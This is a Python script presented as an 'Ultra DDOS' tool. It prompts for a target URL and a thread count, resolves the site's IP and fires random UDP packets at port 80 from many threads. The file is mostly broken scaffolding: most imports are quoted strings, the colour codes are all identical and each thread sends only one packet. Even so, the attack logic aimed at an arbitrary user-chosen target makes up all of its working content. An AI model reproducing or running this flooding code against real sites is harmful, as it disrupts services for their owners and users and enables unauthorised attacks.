# Imports
import socket
"import wget"
from itertools import count
import shutil
"import requests as r, os, threading, random"
"import shutup; shutup.please() # pip3 install shutup"
from threading import Thread
import cmd
"from pystyle import Colors, Colorate, Center"
"import colorama"
"import requests"
"import random"
import string
import sys
"import pcpy"
import time
import os
import urllib.request
import re
import threading
from os import system, name, mkdir,rmdir
"import httpx"
"import undetected_chromedriver as webdriver"
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests
os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

#Ultra DDOS

def create_rnd_msg(msg_size):
	rnd_msg = ""
	for i in range(0, msg_size):
		ch_rnd = random.randint(0, 255)
		rnd_msg += chr(ch_rnd)
	return rnd_msg
site = input("[+] - Target URL => ")
if 'https://'in site:
	site=site.split('https://')[1]
if '/'in site :
	site=site.split('/')[0]
thread_count = int(input("[+] - threads => "))
ip = socket.gethostbyname(site)
UDP_PORT=80
print('\n'*2)
print("[-] - protocol : UDP")
print("[-] - target ip : ", ip )
print("[-] - target port : ", UDP_PORT)

print('\n'*2)
print('_'*9)
i=0
def dos():
		MESSAGE = str.encode(create_rnd_msg(8))
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(MESSAGE, (ip, UDP_PORT))
		print(f'\rSent Successfuly =>  {i}',end='')	
thread_count=thread_count+1
for i in range(thread_count):
	try:
		threading.Thread(target=dos).start()	
	except KeyboardInterrupt:
		exit()
